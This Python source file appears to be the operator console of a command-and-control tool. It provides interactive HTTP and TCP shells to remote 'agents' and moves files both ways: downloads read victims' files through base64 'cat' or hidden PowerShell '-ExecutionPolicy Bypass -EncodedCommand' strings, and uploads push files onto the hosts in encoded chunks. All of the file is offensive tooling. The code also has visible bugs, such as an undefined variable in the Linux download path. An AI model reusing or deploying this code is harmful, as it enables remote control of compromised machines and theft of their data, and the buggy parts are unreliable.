import base64, socket
from core import session_manager
import queue
import subprocess, os, sys


def interactive_http_shell(sid):
    session = session_manager.sessions[sid]
    display = next((a for a, rsid in session_manager.alias_map.items() if rsid == sid), sid)
    meta = session.metadata

    print(f"[*] Interactive HTTP shell with {display}. Type 'exit' to return.")

    while True:
        cmd = input(f"{display}> ").strip()
        if cmd.lower() in ("exit", "quit"):
            break

        if not cmd:
            continue

        if not cmd.lower():
            continue

        b64_cmd = base64.b64encode(cmd.encode()).decode()
        session.command_queue.put(b64_cmd)

        # Wait for output from this session only
        out_b64 = session.output_queue.get()

        try:
            out = base64.b64decode(out_b64).decode("utf-8", "ignore")
        except:
            out = "<decoding error>"

        print(out.rstrip())

def interactive_tcp_shell(sid):
    display = next((a for a, rsid in session_manager.alias_map.items() if rsid == sid), sid)
    client_socket = session_manager.sessions[sid].handler
    print(f"[*] Interactive TCP shell with {display}. Type 'exit' to close.")

    try:
        while True:
            cmd = input(f"{display}> ")
            if cmd.strip().lower() in ("exit", "quit"):
                client_socket.close()
                del session_manager.sessions[sid]
                print(f"[*] Closed TCP session {display}")
                break

            if not cmd.strip():
                continue

            try:
                client_socket.sendall(cmd.encode() + b"\n")

            except BrokenPipeError:
                print("[!] Connection closed by remote host.")
                break

            client_socket.settimeout(10.0)
            response = b''

            while True:
                try:
                    chunk = client_socket.recv(4096)
                    if not chunk:
                        break
                    response += chunk
                except socket.timeout:
                    break

            print(response.decode(errors='ignore').strip())

    except Exception as e:
        print(f"[!] Error: {e}")
        client_socket.close()
        del session_manager.sessions[sid]

### 🧨 File download logic:

# Create encoded powershell command string
def build_powershell_encoded_download(remote_file):
    #safe_path = remote_file.replace("\\", "\\\\")
    #print(remote_file)
    #print(safe_path)



    raw_command = (
        f"[Console]::OutputEncoding = [System.Text.Encoding]::ASCII; "
        f"$bytes = [IO.File]::ReadAllBytes('{remote_file}'); "
        "[Convert]::ToBase64String($bytes)"
    )
    #print(raw_command)
    encoded_bytes = raw_command.encode("utf-16le")
    encoded_b64 = base64.b64encode(encoded_bytes).decode()
    full_cmd = f"powershell -NoProfile -ExecutionPolicy Bypass -EncodedCommand {encoded_b64}"
    return full_cmd

    # Encode to UTF-16LE as required by EncodedCommand
    #utf16_command = raw_command.encode("utf-16le")
    #encoded_command = base64.b64encode(utf16_command).decode()

    #return f"powershell -EncodedCommand {encoded_command}"



def download_file_http(sid, remote_file, local_file):
    session = session_manager.sessions[sid]
    meta = session.metadata

    if meta.get("os", "").lower() == "linux":
        host = meta.get("hostname", "").lower()
        command = f"cat {remote_file} | base64 -w0"
        b64_command = base64.b64encode(command.encode()).decode()
        session.command_queue.put(b64_cmd)

        print(f"[*] Downloading file from {host}...")

        b64_output = session.output_queue.get()

        try:
            decode1 = base64.b64decode(b64_output)
            decode2 = base64.b64decode(decode1)
            agent_output = decode2.decode(errors='ignore').strip

            with open(local_file, "w") as f:
                f.write(agent_output)

            print(f"[+] Download complete. Saved to {local_file}")

        except Exception as e:
            print(f"[!] Error decoding file: {e}")

    elif meta.get("os", "") .lower() == "windows":
        # Build fully encoded PowerShell command (same as TCP)
        encoded_ps = build_powershell_encoded_download(remote_file)
        b64_cmd = base64.b64encode(encoded_ps.encode()).decode()
        session.command_queue.put(b64_cmd)

        print(f"[*] Waiting for file from HTTP agent {sid}...")

        b64_output = session.output_queue.get()


        try:
            # Decode the agent output like TCP
            """agent_output_utf16 = base64.b64decode(b64_output)
            print(b64_output)
            print(agent_output_utf16)
            final_base64 = base64.b64decode(agent_output_utf16)
            print(final_base64)"""

            #agent_output = b64_output.decode(errors='ignore').strip()

            # Now decode the file data from base64 into raw bytes
        
            file_bytes = base64.b64decode(b64_output)
        
            finalde = base64.b64decode(file_bytes)
        
            agent_output = finalde.decode(errors='ignore').strip()
        

            with open(local_file, "w") as f:
                f.write(agent_output)

            # Apply iconv re-encoding for UTF-8 output
            subprocess.run(['iconv', '-f', 'UTF-16LE', '-t', 'UTF-8', local_file, '-o', local_file + '.tmp'])
            os.replace(local_file + '.tmp', local_file)

            print(f"[+] Download complete. Saved to {local_file}")

        except Exception as e:
            print(f"[!] Error decoding file: {e}")




def download_file_tcp(sid, remote_file, local_file):
    client_socket = session_manager.sessions[sid].handler

    try:
        #safe_path = sanitize_path(remote_file)
        """powershell_download = (
    f"powershell -NoProfile -ExecutionPolicy Bypass -Command "
    f"\"[Console]::OutputEncoding = [System.Text.Encoding]::ASCII; "
    f"$bytes = [IO.File]::ReadAllBytes('{remote_file}'); "
    "[Convert]::ToBase64String($bytes)\""
)"""

        #print(powershell_download)

        encoded_ps = build_powershell_encoded_download(remote_file)
        command = encoded_ps + "\n"
        client_socket.sendall(command.encode())

        client_socket.settimeout(2)
        raw_data = b""

        while True:
            try:
                chunk = client_socket.recv(4096)
                #print(chunk)
                if not chunk:
                    break
                raw_data += chunk
            except socket.timeout:
                break

        #print(raw_data)

        #agent_output = raw_data.decode("utf-16le", errors="ignore").strip()

        agent_output = raw_data.decode(errors="ignore").strip()
        #print(agent_output)

        # Step 1: decode agent b64 output
        #utf16_bytes = base64.b64decode(agent_output)
        #agent_b64_data = utf16_bytes.decode("utf-16le").strip()
        

        # Step 2: decode actual file content
        file_bytes = base64.b64decode(agent_output)
        """print(file_bytes)
        print(agent_output)"""
        

        with open(local_file, "wb") as f:
            f.write(file_bytes)

        subprocess.run(['iconv', '-f', 'UTF-16LE', '-t', 'UTF-8', local_file, '-o', local_file + '.tmp'])
        os.replace(local_file + '.tmp', local_file)

        print(f"[+] Download complete. Saved to {local_file}")

    except Exception as e:
        print(f"[!] Download failed: {e}")


### 🔥 Upload Logic (NEW!) ###

CHUNK_SIZE = 7000  #You can change this!!

# Build the powershell to append a chunk
def build_chunk_upload_command(remote_file, b64chunk):
    safe_chunk = b64chunk.replace("'", "''")  # PowerShell escape for single quotes
    #safe_path = remote_file.replace("\\", "\\\\")

    raw_commanddata = (
        "[Console]::OutputEncoding = [System.Text.Encoding]::ASCII;"
        "[Console]::InputEncoding  = [System.Text.Encoding]::ASCII;"
        f"$bytes = [Convert]::FromBase64String('{safe_chunk}');"
        f"$stream = [System.IO.File]::Open('{remote_file}', 'Append', 'Write', 'None');"
        "$stream.Write($bytes, 0, $bytes.Length);"
        "$stream.Close()"
    )

    encoded_command = base64.b64encode(raw_commanddata.encode("utf-16le")).decode()
    full_cmd = f"powershell -NoProfile -ExecutionPolicy Bypass -EncodedCommand {encoded_command}"
    return full_cmd


# Upload for HTTP agents
def upload_file_http(sid, local_file, remote_file):
    session = session_manager.sessions[sid]

    # Read file and prepare chunks
    with open(local_file, "rb") as f:
        file_data = f.read()

    b64_data = base64.b64encode(file_data).decode()

    # Clear existing remote file
    clear_cmd = f"&{{ Try {{ Remove-Item -Path '{remote_file}' -ErrorAction Stop }} Catch {{ }} }}"
    b64_clear = base64.b64encode(clear_cmd.encode()).decode()
    session.command_queue.put(b64_clear)
    #session.output_queue.get()  # consume output

    print(f"[*] Uploading file to HTTP agent {sid}...")

    # Send chunks
    for i in range(0, len(b64_data), CHUNK_SIZE):
        #print("TEST")
        chunk = b64_data[i:i+CHUNK_SIZE]
        chunk_cmd = build_chunk_upload_command(remote_file, chunk)
        b64_chunk_cmd = base64.b64encode(chunk_cmd.encode()).decode()
        session.command_queue.put(b64_chunk_cmd)
        #session.output_queue.get()
        #print(f"  [+] Uploaded chunk {i//CHUNK_SIZE + 1}")

    print(f"[+] Upload complete for {remote_file}")

# Upload for TCP agents
def upload_file_tcp(sid, local_file, remote_file):
    client_socket = session_manager.sessions[sid].handler
    #print("MADEIT")

    with open(local_file, "rb") as f:
        file_data = f.read()

    b64_data = base64.b64encode(file_data).decode()
    """print(b64_data)"""
    #print("READ LOCAL FILE")

    # Clear existing remote file
    clear_cmd = f"&{{ Try {{ Remove-Item -Path '{remote_file}' -ErrorAction Stop }} Catch {{ }} }}\n"
    #print(clear_cmd)
    #print("CREATED REMOVE COMMAND")
    client_socket.sendall(clear_cmd.encode())
    #print("TEST")
    """c = client_socket.recv(4096)
    if c is None:
        print("IT IS NONE")
    print(c)"""
    #print("STEP1")

    print(f"[*] Uploading file to TCP agent {sid}...")

    for i in range(0, len(b64_data), CHUNK_SIZE):
        chunk = b64_data[i:i+CHUNK_SIZE]
        #print(chunk)
        chunk_cmd = build_chunk_upload_command(remote_file, chunk) + "\n"
        #print(chunk_cmd)
        client_socket.sendall(chunk_cmd.encode())
        #client_socket.recv(4096)
        #print(f"  [+] Uploaded chunk {i//CHUNK_SIZE + 1}")
        

    print(f"[+] Upload complete for {remote_file}")
    #print(len(b64_data))


output_queue = queue.Queue()

def printer_thread():
    while True:
        sid, out_b64 = output_queue.get()
        try:
            out = base64.b64decode(out_b64).decode("utf-8", "ignore")
            #print("TEST")
        except:
            out = "<decoding error>"
        print(f"\n[{sid}] {out.strip()}")

